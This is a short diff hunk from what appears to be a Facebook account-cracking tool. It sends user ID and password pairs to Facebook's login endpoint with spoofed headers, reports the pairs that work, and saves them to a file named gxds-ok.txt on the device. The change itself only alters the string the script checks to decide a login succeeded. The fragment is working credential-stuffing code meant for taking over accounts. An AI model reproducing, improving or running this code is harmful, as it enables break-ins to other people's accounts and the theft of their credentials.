@@ -489,7 +489,7 @@ def gxds_files(uid, pxss):
             'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
             p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
             lxgin=json.loads(p)
-            if "c_user" in lxgin:
+            if "session_key" in lxgin:
                 print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " -\033[0;35m " + yxxr(uid))
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
